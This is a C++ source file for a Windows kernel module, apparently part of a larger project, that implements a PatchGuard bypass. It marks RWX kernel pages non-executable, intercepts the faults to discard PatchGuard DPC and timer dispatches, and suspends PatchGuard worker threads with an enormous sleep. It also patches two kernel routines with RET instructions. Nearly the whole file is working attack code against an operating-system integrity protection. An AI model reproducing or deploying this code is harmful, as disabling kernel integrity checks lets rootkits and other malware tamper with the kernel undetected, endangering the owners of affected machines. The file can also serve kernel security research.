#include "nopg.hpp"
#include <ia32.hpp>
#include <apollo/attributes.hpp>
#include <sdk/ldr/km/data_table_entry_t.hpp>
#include <sdk/ps/api.hpp>
#include <sdk/mm/api.hpp>
#include <sdk/ke/api.hpp>
#include <sdk/expi/api.hpp>
#include <sdk/nt/mode_t.hpp>
#include <sdk/kuser/api.hpp>
#include <map>
#include <ntpp.hpp>
#include <xedpp.hpp>
#include "../hooks/inline_hooks.hpp"
#include "../hooks/patch_manager.hpp"
#include "../utility/memory.hpp"
#include "../utility/thread.hpp"
#include "../sched/irq.hpp"
#include "../utility/memory_isolation.hpp"

namespace nopg
{
	static constexpr bool nopg_debug = is_debug_build() && true;
	static constexpr bool nopg_disable_timer_dispatch = true;
	static constexpr bool nopg_disable_dpc_dispatch =   true;
	static constexpr bool nopg_disable_context_dpc =    true;
	static constexpr auto ignored_pxi_flags = mem::va_image | mem::va_session | mem::va_process | mem::va_self_ref | mem::va_paged;
	inline static bool is_va_ignored( any_ptr virtual_address ) { return mem::lookup_va_flags( virtual_address ) & ignored_pxi_flags; }

	NO_INLINE bool on_knx_fault( void* virtual_address, nt::trapframe* tf )
	{
		// If ignored region, skip.
		//
		if ( is_va_ignored( virtual_address ) )
			return false;

		// Get IRQL, display details.
		//
		uint64_t last_valid_vpn = 0;
		auto* stack = ( void** ) ( tf->rsp & ~7ull );
		irql_t irql = ia32::get_effective_irql( tf->rflags );
		if constexpr ( nopg_debug ) {
			xstd::log( "KNX Caught @ %p\n", tf->rip );
			xstd::log( "RSP:  %p\n", tf->rsp );
			xstd::log( "RAX:  %p\n", tf->rax );
			xstd::log( "RCX:  %p\n", tf->rcx );
			xstd::log( "RDX:  %p\n", tf->rdx );
			xstd::log( "RBX:  %p\n", tf->rbx );
			xstd::log( "RBP:  %p\n", tf->rbp );
			xstd::log( "R8:   %p\n", tf->r8 );
			xstd::log( "R9:   %p\n", tf->r9 );
			xstd::log( "R10:  %p\n", tf->r10 );
			xstd::log( "R11:  %p\n", tf->r11 );
			xstd::log( "IRQL: %d\n", irql );
			for ( uint64_t p = tf->rip; p < ( tf->rip + 32 ); ) {
				if ( !mem::is_address_valid( p ) || !mem::is_address_valid( p + 15 ) ) {
					break;
				}
				auto ins = xed::decode64( ( void* ) p );
				if ( !ins ) break;
				xstd::log( "%p: %s\n", p, ins->to_string() );
				p += ins->length();
			}
		}

		// Dispatch level or IPI level PatchGuard components:
		//
		if ( irql >= DISPATCH_LEVEL ) {
			uint8_t* bytes = ( uint8_t* ) tf->rip;

			// KiDpcDispatch/CmpAppendDllSection clone called from dummy DPCs, decrypts and calls into pg context.
			//
			if ( nopg_disable_context_dpc && !memcmp( bytes, "\x2E\x48\x31", 3 ) ) {
				if ( !mem::is_cannonical( tf->rdx ) ) {
					if ( tf->rcx == tf->rip ) {
						if constexpr ( nopg_debug )
							xstd::log( "Discarded CmpAppendDllSection DPC: %llx\n", tf->rip );
						tf->rip = *( uint64_t* ) tf->rsp;
						tf->rsp += 8;
						return true;
					}
				}
			} 
			else if ( nopg_disable_dpc_dispatch && !memcmp( bytes, "\x48\x31", 2 ) ) {
				if ( !mem::is_cannonical( tf->rdx ) ) {
					if ( ( tf->rip - 0x70 ) <= tf->rcx && tf->rcx <= ( tf->rip + 0x70 ) ) {
						if constexpr ( nopg_debug )
							xstd::log( "Discarded KiDpcDispatch DPC: %llx\n", tf->rip );
						tf->rip = *( uint64_t* ) tf->rsp;
						tf->rsp += 8;
						return true;
					}
				}
			}

			// KiTimerDispatch clone called from KiExecuteAllDpcs, decrypts and calls into pg context.
			//
			if constexpr ( nopg_disable_timer_dispatch ) {
				for ( int i = 0; i < 0x20; i++ ) {
					// pushfq
					if ( bytes[ i + 0 ] == 0x48 && bytes[ i + 1 ] == 0x9C ) {
						for ( int j = i; j < 0x20; j++ ) {
							// sub rsp
							if ( bytes[ j + 0 ] == 0x48 && bytes[ j + 1 ] == 0x83 ) {
								if constexpr ( nopg_debug )
									xstd::log( "Discarded KiTimerDispatch: %llx\n", tf->rip );
								tf->rip = *( uint64_t* ) tf->rsp;
								tf->rsp += 8;
								return true;
							}
						}
					}
				}
			}

			// If above DISPATCH_LEVEL, break.
			//
			if ( irql > DISPATCH_LEVEL ) {
				goto false_positive;
			}
			// If not system thread break.
			//
			else if ( ke::get_eprocess() != ntpp::get_initial_system_process() ) {
				goto false_positive;
			} 
			// If actual DPC delivered, break.
			//
			else if ( ntpp::is_executing_dpcs() ) {
				goto false_positive;
			}
		}

		// Deferred work item?
		//
		for ( int i = 0; i < 0x20; i++ ) {
			// Validate stack pointer.
			//
			auto* value_ptr = &stack[ i ];
			if ( auto vpn = uint64_t( value_ptr ) >> 12; vpn != last_valid_vpn ) {
				if ( !mem::is_address_valid( value_ptr ) ) {
					break;
				}
				last_valid_vpn = vpn;
			}

			// Check if it matches the value we expected.
			//
			void* value = *value_ptr;
			if ( value != &ke::delay_execution_thread && value != &ke::wait_for_multiple_objects && value != &ke::wait_for_single_object ) {
				continue;
			}

			// Align stack
			tf->rsp &= ~0xF;

			// Set the arguments on stack
			tf->rcx = ( uint64_t ) nt::mode_t::kernel_mode;
			tf->rdx = false;
			*( int64_t* ) ( tf->r8 = ( tf->rsp + 0x28 ) ) = -0x11F0231A4F3000;

			// Simulate call [KeDelayExecutionThread]
			*( uint64_t* ) tf->rsp = tf->rip;
			tf->rsp += 8;
			tf->rip = ( uint64_t ) &ke::delay_execution_thread;
		
			// Lower IRQL and return.
			//
			if constexpr ( nopg_debug )
				xstd::log( "Suspended PatchGuard worker thread: %llx\n", ntpp::get_client_id().unique_thread );
			ia32::set_irql( APC_LEVEL );
			tf->rflags.interrupt_enable_flag = true;
			return true;
		}

		// False positive, fix NX and continue.
		//
	false_positive:
		auto [pte, _] = mem::lookup_pte( virtual_address );
		xstd::atomic_bit_reset( pte->flags, PT_ENTRY_64_EXECUTE_DISABLE_BIT );
		return true;
	}

	// Initializes the patchguard bypass.
	//
	NO_INLINE void init()
	{
		// Fetch the number of processors and distribute the work.
		//
		const uint16_t num_processors = ( uint16_t ) apic::number_of_processors();
		const uint16_t range_per_cpu = 512 / num_processors;
		static constexpr auto get_range = [ ] ( uint16_t range_per_cpu ) -> std::pair<uint16_t, uint16_t>
		{
			// [ idx*R, (idx+1)*R ]
			uint16_t rmin = uint16_t( ia32::read_pcid() ) * range_per_cpu;
			uint16_t rmax = rmin + range_per_cpu;
			
			// If last range, round to max.
			if ( ( rmax + range_per_cpu ) >= 512 )
				rmax = 512;
			
			return { rmin, rmax };
		};

		// Add the patches and call the IPI.
		//
		if ( sdk::exists( ki::sw_interrupt_dispatch ) )
			hook::patch( &ki::sw_interrupt_dispatch, { 0xC3 } );
		if ( sdk::exists( ki::mca_deferred_recovery_service ) )
			hook::patch( &ki::mca_deferred_recovery_service, { 0xC3 } );

		scheduler::call_ipi( [ & ] ( auto barrier ) {
			barrier->up();

			// Determine the range we scan.
			//
			auto [range_min, range_max] = get_range( range_per_cpu );

			// Iterate all top level page table entires in kernel address space.
			//
			for ( size_t ipxe = 256; ipxe != 512; ipxe++ ) {
				// If ignored region, skip.
				//
				if ( mem::get_pxi_flags( ipxe ) & ignored_pxi_flags )
					continue;

				auto rec = [ & ] <auto N> ( auto&& self, uint64_t va, xstd::const_tag<N>, size_t imin, size_t imax )
				{
					auto pte = mem::get_pte( va, N );

					// Skip if not present.
					//
					if ( !pte->present )
						return;
					
					// If we did not reach the bottom level:
					//
					if constexpr ( N != 0 ) {
						// If directory:
						//
						if ( !pte->large_page ) {
							// Iterate all pt entries:
							//
							for ( size_t ipte = imin; ipte != imax; ipte++ )
								self( self, va | ( ipte << ( 12 + 9 * ( N - 1 ) ) ), xstd::const_tag<N - 1>{}, 0, 512 );
							return;
						}
						// If large page, skip if too large to be considered.
						//
						else if constexpr ( N > 1 ) {
							return;
						}
						// Fallthrough to page handling.
					}

					// Skip if not RWX.
					//
					if ( !pte->write || pte->execute_disable )
						return;

					// Skip if our own pages.
					//
					if ( mem::iso::is_isolated( pte->page_frame_number ) )
						return;

					// Skip if user-mode memory mapped to kernel.
					//
					if ( !is_kernel_va( mem::get_virtual_address( pte->page_frame_number << 12 ), true ) )
						return;

					// Disable execution.
					//
					xstd::atomic_bit_set( pte->flags, PT_ENTRY_64_EXECUTE_DISABLE_BIT );
				};
				rec( rec, mem::make_cannonical( ipxe << ( mem::va_bits - 9 ) ), xstd::const_tag<mem::page_table_depth - 1>{}, range_min, range_max );
			}

			// Flush the TLB and return.
			//
			barrier->down();
			ia32::flush_tlb();
		} );
	}
};